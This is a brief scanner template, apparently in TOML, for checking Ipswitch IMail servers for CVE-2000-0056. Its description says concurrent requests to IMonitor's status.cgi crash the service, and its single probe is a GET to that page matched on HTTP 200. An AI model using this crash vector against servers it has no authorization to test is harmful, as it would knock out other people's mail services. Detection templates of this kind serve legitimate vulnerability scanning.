[info]
author = "ave"
description = "Ipswitch IMail 5.0.8/6.0/6.1 IMonitor status.cgi 存在拒绝服务漏洞，大量并发请求导致崩溃"
id = "POC-AVE-2000-0047"
name = "Ipswitch IMail IMonitor status.cgi Denial of Service PoC"
severity = "medium"
tags = [
    "cve-2000-0056",
    "dos",
    "imonitor",
]
vuln_id = [
    "CVE-2000-0056",
    "AVE-2000-0047",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/status.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
